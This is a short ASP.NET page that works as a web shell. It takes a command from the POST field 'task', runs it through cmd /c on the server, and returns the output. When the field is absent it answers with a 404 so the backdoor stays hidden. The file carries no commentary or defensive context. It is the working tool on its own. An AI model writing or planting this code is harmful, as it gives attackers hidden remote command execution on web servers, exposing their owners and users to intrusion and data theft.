<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, System.EventArgs e) {
    if (Request.Form["task"] == null) {
        HttpContext.Current.Response.StatusCode = 404;
        Response.End();
        return;
    }
    System.Diagnostics.ProcessStartInfo start = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + Request.Form["task"]);
    start.RedirectStandardOutput = true;
    start.UseShellExecute = false;
    System.Diagnostics.Process child = new System.Diagnostics.Process();
    child.StartInfo = start;
    child.Start();
    Response.Write(child.StandardOutput.ReadToEnd());
}
</script>
